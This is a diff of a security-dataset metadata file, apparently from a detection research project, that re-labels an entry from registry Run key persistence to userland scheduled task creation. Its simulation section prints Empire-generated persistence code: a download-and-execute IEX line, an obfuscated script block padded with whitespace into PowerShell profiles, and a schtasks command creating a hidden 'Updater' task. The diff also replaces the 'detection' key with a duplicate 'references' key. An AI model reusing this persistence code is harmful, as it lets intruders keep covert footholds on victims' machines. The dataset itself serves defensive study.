@@ -1,6 +1,6 @@
-id: 190319-RunKeysModification-UserlandRunKey
-title: Userland Registry Run Key Modification
-description: This dataset represents adversaries modifying local Run registry keys (i.e. HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run) for persistence.
+id: 190319-SchTasksCreation-Userland
+title: Userland Scheduled Task Creation
+description: This dataset represents adversaries creating a scheduled task locally from a non-elevated session to maintain persistence in an environment.
 references:
 
 collaborators:
@@ -11,20 +11,25 @@ platform:
   - Windows
 type: atomic
 tags:
-  - Userland
-  - Registry Run Keys
+  - Local Scheduled Tasks
 
 attack_mappings:
-  - technique: T1547
-    sub-technique: "001"
+  - technique: T1053
+    sub-technique: "005"
     tactics:
       - TA0003
 
 datasets:
   endpoint:
     - log_source: Microsoft-Windows-Sysmon
-      size: 102.27 kB
-      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190319-RunKeysModification-UserlandRunKey/WORKSTATION6_Windows_MicrosoftWindowsSysmonOperational.zip
+      size: 239.97 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190319-SchTasksCreation-Userland/WORKSTATION6_Windows_MicrosoftWindowsSysmonOperational.zip
+    - log_source: Microsoft-Windows-Security-Auditing
+      size: 30.73 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190319-SchTasksCreation-Userland/WORKSTATION6_Windows_Security.zip
+    - log_source: Microsoft-Windows-Security-Auditing
+      size: 866.00 B
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190319-SchTasksCreation-Userland/WORKSTATION6_Windows_MicrosoftWindowsTaskSchedulerOperational.zip
 
 simulation:
   environment: Blacksmith
@@ -34,15 +39,15 @@ simulation:
       module: PowerShell
       script: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1
   permissions_required:
-    - Standard User
+    - User
   adversary_view: |-
     Adversary Box
     -------------
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1')
     
     $InvokeWhoami= { Invoke-Expression whoami }
-    $UserOptions = New-UserPersistenceOption -Registry -AtLogon
-    $ElevatedOptions = New-ElevatedPersistenceOption -Registry -AtLogon
+    $UserOptions = New-UserPersistenceOption -ScheduledTask -Daily -At '8 AM'
+    $ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -Daily -At '8 AM'
     Add-Persistence -ScriptBlock $InvokeWhoami -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose
 
     Victim Box
@@ -58,9 +63,9 @@ simulation:
     $Script={sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('U/DMK8vPTtV1rSgoSi0uzszPUyjPyE/MzVQAAA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()}
     if($Persist){
     if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
-    {$Prof=$PROFILE.AllUsersAllHosts;$Payload='New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"'}
+    {$Prof=$PROFILE.AllUsersAllHosts;$Payload="schtasks /Create /RU system /SC DAILY /ST 08:00:00 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`""}
     else
-    {$Prof=$PROFILE.CurrentUserAllHosts;$Payload='New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"'}
+    {$Prof=$PROFILE.CurrentUserAllHosts;$Payload="schtasks /Create /SC DAILY /ST 08:00:00 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`""}
     if(!(Test-Path $Prof)){New-Item -Path $Prof -Type File -Force}
     ' '*600+$Script.ToString()|Out-File $Prof -A -NoC -Fo
     iex $Payload|Out-Null
@@ -72,7 +77,7 @@ simulation:
     Run
     ---
     PS C:\Windows\system32>.\Persistence.ps1
-    New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"
+    
     PS C:\Windows\system32>
 
-detection:
+references:
